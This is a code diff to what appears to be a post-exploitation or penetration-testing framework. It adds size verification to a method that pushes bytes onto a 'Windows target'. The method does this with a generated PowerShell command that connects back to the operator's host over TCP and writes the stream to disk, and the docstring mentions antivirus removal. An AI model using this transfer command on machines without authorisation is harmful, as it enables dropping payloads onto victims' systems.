@@ -358,20 +358,41 @@ class KoiModule(ABC):
         timeout: float = TIMEOUTS["upload"],
         on_progress: Optional[Callable[[int], None]] = None,
     ) -> bool:
-        """Transfer *raw* bytes to *dest* on a Windows target via a PS TCP client."""
+        """Transfer *raw* bytes to *dest* on a Windows target via a PS TCP client.
+
+        The transfer is verified by comparing the on-target file size to the
+        number of bytes sent (same approach as the Linux path), so a silent
+        write failure (access denied, AV removal, full disk) is reported as a
+        failure instead of a false success.
+        """
         local_ip = self._get_local_ip()
+        resolved = (
+            "$ExecutionContext.SessionState.Path."
+            f"GetUnresolvedProviderPathFromPSPath('{dest}')"
+        )
         port, thread, errors = spawn_send_server(raw, timeout=timeout, on_progress=on_progress)
         ps_cmd = (
             f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{port});"
             f"$_s=$_c.GetStream();"
-            f"$_f=[IO.File]::OpenWrite($ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath('{dest}'));"
+            f"$_f=[IO.File]::OpenWrite({resolved});"
             f"$_b=New-Object byte[] 65536;"
             f"while(($_n=$_s.Read($_b,0,$_b.Length))-gt 0){{$_f.Write($_b,0,$_n)}};"
             f"$_f.Close();$_c.Close()"
         )
         self._dispatch_ps(ps_cmd)
         thread.join(timeout=timeout)
-        return not errors
+
+        if errors:
+            return False
+
+        size_str = self._win_query(
+            f"(Get-Item -LiteralPath ({resolved}) -EA SilentlyContinue).Length",
+            timeout=timeout,
+        )
+        try:
+            return int(size_str.strip()) == len(raw)
+        except (ValueError, AttributeError):
+            return False
 
     def _upload_bytes(
         self,
